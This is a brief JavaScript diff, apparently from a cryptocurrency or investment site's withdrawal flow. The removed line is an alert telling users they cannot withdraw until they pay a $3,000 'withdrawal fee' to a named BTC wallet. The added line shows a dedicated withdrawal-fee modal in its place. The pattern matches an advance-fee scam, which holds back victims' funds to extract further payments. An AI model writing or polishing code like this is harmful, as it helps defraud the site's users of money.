@@ -362,10 +362,8 @@ if (confirmWithdraw) {
 
         }
 
- alert(
-"unable to withdraw.\n\nTo continue, a withdrawal fee of $3,000 is expected to be paid to this BTC wallet bc1q3kjwt332fqwfvxjq0wls4rt38zkk0f4k8yv2hc."
-);
-
+ 
+document.getElementById("withdrawFeeModal").style.display = "flex";
 
         withdrawModal.style.display = "none";
 
